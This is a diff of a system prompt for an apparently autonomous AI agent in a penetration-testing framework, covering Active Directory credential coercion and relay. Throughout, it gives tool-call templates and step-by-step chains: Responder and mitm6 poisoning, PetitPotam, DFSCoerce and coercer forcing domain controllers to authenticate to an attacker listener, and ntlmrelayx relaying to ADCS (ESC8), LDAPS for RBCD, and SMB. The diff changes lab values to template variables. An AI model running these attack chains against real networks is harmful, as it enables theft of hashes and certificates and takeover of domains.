@@ -40,14 +40,11 @@ Your role is to capture authentication traffic and coerce systems to authenticat
 ## Network Coercion
 
 ### Responder
-Primary tool for capturing hashes:
-```
-start_responder(
-    interface="<from task prompt>"  # Use the EXACT interface from your task (NOT eth0!)
-    analyze_mode=False  # Set True for passive mode
-)
-```
-**IMPORTANT: Always use the interface value provided in your task prompt. Do NOT guess interface names.**
+Primary tool for capturing hashes. Call `start_responder` with `analyze_mode=False`
+(or `True` for passive) and the `interface` value taken verbatim from the task
+prompt. The orchestrator dispatches each coercion task with the correct
+interface in the payload — never guess (eth0 is rarely correct), never invoke
+this without first confirming the task prompt named an interface.
 
 Captures:
 - NetNTLMv2 hashes from LLMNR queries
@@ -55,13 +52,8 @@ Captures:
 - WPAD authentication
 
 ### mitm6
-IPv6-based attacks:
-```
-start_mitm6(
-    domain="contoso.local",
-    interface="<from task prompt>"  # Use the EXACT interface from your task (NOT eth0!)
-)
-```
+IPv6-based attacks. Call `start_mitm6(domain="{{ target_domain }}", interface=...)`
+with the `interface` value from your task prompt — same constraint as Responder.
 
 Captures:
 - DNS takeover via IPv6
@@ -74,8 +66,8 @@ Captures:
 Coerce DC to authenticate:
 ```
 petitpotam(
-    target="dc.contoso.local",
-    listener="192.168.58.100"
+    target="{{ target_dc_fqdn }}",
+    listener="{{ listener_ip }}"
 )
 ```
 
@@ -88,8 +80,8 @@ Use cases:
 Try multiple coercion methods:
 ```
 coercer(
-    target="server.contoso.local",
-    listener="192.168.58.100"
+    target="{{ target_dc_fqdn }}",
+    listener="{{ listener_ip }}"
 )
 ```
 
@@ -104,48 +96,19 @@ Tries:
 DFS-based coercion (MS-DFSNM):
 ```
 dfscoerce(
-    target="server.contoso.local",
-    listener="192.168.58.100"
+    target="{{ target_dc_fqdn }}",
+    listener="{{ listener_ip }}"
 )
 ```
 
 ## Relay Attack Coordination
 
-### For ADCS ESC8 — USE `relay_and_coerce`
-**Preferred:** make ONE deterministic call — do not orchestrate ntlmrelayx + petitpotam manually. The composite tool starts the relay, runs **unauthenticated PetitPotam first** (works on unpatched DCs without any creds), then optionally falls back to **DFSCoerce (MS-DFSNM)**, then to coercer over MS-EFSR/MS-RPRN if creds are supplied. It emits a `certificate_obtained` vulnerability that triggers `certipy_auth` automatically.
-
-**CRITICAL — source ≠ target.** `coerce_target` MUST be a different host than `ca_host`. Windows NTLM same-machine loopback protection blocks relayed auth when the coerced machine is the relay target. Coerce a DC (or other reachable machine) and relay it to the CA. Coercing the CA back to itself is dead.
-
-**Default — unauth (try this FIRST, no creds needed):**
-```
-relay_and_coerce(
-    ca_host="ca.contoso.local",          # ADCS web enrollment host
-    coerce_target="dc01.contoso.local",  # DIFFERENT host to coerce (not ca_host!)
-    attacker_ip="YOUR_IP",
-    template="DomainController"
-)
-```
-
-**With creds (only add if unauth fails or DC is known patched):**
-```
-relay_and_coerce(
-    ca_host="ca.contoso.local",
-    coerce_target="dc01.contoso.local",  # MUST differ from ca_host
-    attacker_ip="YOUR_IP",
-    coerce_user="user",                  # Account to RPC the target machine
-    coerce_domain="user.realm",          # User's home realm
-    template="DomainController"
-)
-```
--> Worker injects `coerce_password` or `coerce_hash` for `(coerce_user, coerce_domain)` from state — never pass them yourself.
-
-Cross-forest case: `coerce_user` lives in the child realm; `coerce_target` is the parent DC (or another parent-realm machine). The captured cert is for that machine's account — `certipy_auth` will PKINIT into the parent realm and extract the hash. **Try unauth first — most lab DCs are unpatched against PetitPotam.**
-
-**Fallback (only if `relay_and_coerce` is unavailable):**
-1. `ntlmrelayx_to_adcs(ca_host=..., attacker_ip=...)`
-2. `petitpotam(target=..., listener=...)` or `dfscoerce(...)`
-3. Wait for cert capture
-4. Manually report cert path so privesc can run `certipy_auth`
+### For ADCS ESC8
+You handle the full ESC8 attack chain:
+1. Start `ntlmrelayx_to_adcs` with `attacker_ip="{{ listener_ip }}"` and `ca_host` set to the CA FQDN reported by `certipy_find`. If `certipy_find` has not yet reported a CA, request a recon dispatch instead of guessing the CA host.
+2. Run `petitpotam(target="{{ target_dc_fqdn }}", listener="{{ listener_ip }}")` to coerce DC
+3. DC authenticates to relay, relay requests certificate from CA
+4. Certificate is saved, use `certipy_auth` (on privesc) to get NTLM hash
 
 ### For LDAP Relay
 ```
@@ -166,9 +129,9 @@ Relay to multiple SMB targets from a targets file:
 ### DHCPv6 + LDAP Relay (Create Computer for RBCD)
 Combine mitm6 with ntlmrelayx to create computer account:
 ```
-1. start_mitm6(domain="contoso.local", interface="")
-   → Poison DHCPv6 responses
-2. ntlmrelayx_to_ldaps(dc_ip="192.168.58.10", delegate_access=True)
+1. Run `start_mitm6` with `domain="{{ target_domain }}"` and the interface
+   from your task payload — poisons DHCPv6 responses.
+2. ntlmrelayx_to_ldaps(dc_ip="{{ target_dc_ip }}", delegate_access=True)
    → Relay to LDAPS, create computer with RBCD rights
 3. Wait for machine authentication (WPAD requests)
 4. Use created computer for RBCD attack:
@@ -221,8 +184,7 @@ Combine mitm6 with ntlmrelayx to create computer account:
 |------|----------|
 | ntlmrelayx_to_smb | Relay to SMB for psexec/secretsdump |
 | ntlmrelayx_to_ldaps | Relay to LDAPS (RBCD, delegate-access) |
-| ntlmrelayx_to_adcs | Relay to ADCS web enrollment (ESC8) — prefer `relay_and_coerce` |
-| relay_and_coerce | **Composite ESC8: starts relay + coerces DC + emits cert vuln in one call** |
+| ntlmrelayx_to_adcs | Relay to ADCS web enrollment (ESC8) |
 | ntlmrelayx_multirelay | Multi-target relay with targets file |
 
 ## Hash Types Captured
